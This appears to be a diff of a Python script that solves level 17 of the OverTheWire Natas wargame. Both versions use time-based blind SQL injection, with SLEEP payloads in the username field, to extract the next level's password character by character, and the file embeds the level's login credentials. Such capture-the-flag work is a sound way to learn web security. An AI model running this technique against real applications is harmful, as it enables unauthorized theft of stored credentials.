@@ -1,32 +1,43 @@
 import requests
-import string
 from requests.auth import HTTPBasicAuth
+import string
+import time
 
-basicAuth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
-headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+url = "http://natas17.natas.labs.overthewire.org/index.php"
+auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
 
-u="http://natas17.natas.labs.overthewire.org/index.php?debug"
+password = ""
+# Try both uppercase and lowercase
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
-password="6OG1PbKdVjyBRzhRm45678" # start with blank password
-count = 1   # substr() length argument starts at 1
-PASSWORD_LENGTH = 45  # previous passwords were 32 chars long
-VALID_CHARS = string.digits + string.ascii_letters
-
-while count <= PASSWORD_LENGTH + 1: 
-    for c in VALID_CHARS: 
-        payload=("username=natas18"
-             "\" AND "
-             "IF(BINARY substring(password,1," + str(count) + ") = '" +
-             password + c + "', sleep(2), False)"
-             " -- ")
-
-        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False) 
-
-        # print(payload, " ------ ", response.elapsed) 
+print("Extracting password...")
+for position in range(1, 33):
+    found = False
+    for char in charset:
+        # BINARY keyword forces case-sensitive comparison
+        payload = f'natas18" AND BINARY SUBSTRING(password,{position},1)=BINARY "{char}" AND SLEEP(2)-- -'
         
-        if (response.elapsed.total_seconds() > 2):
-            print("Found one more char : %s" % (password+c))
-            password += c
-            count = count + 1
+        try:
+            start = time.time()
+            r = requests.post(url, auth=auth, data={'username': payload}, timeout=4)
+            elapsed = time.time() - start
+            
+            if elapsed >= 1.8:
+                password += char
+                print(f"Pos {position}: '{char}' -> {password}")
+                found = True
+                break
+        except requests.Timeout:
+            password += char
+            print(f"Pos {position}: '{char}' -> {password}")
+            found = True
+            break
+        except Exception as e:
+            continue
+    
+    if not found:
+        print(f"STUCK at position {position}!")
+        print(f"Password so far: {password}")
+        break
 
-print("Done!")
+print(f"\nFinal: {password}")
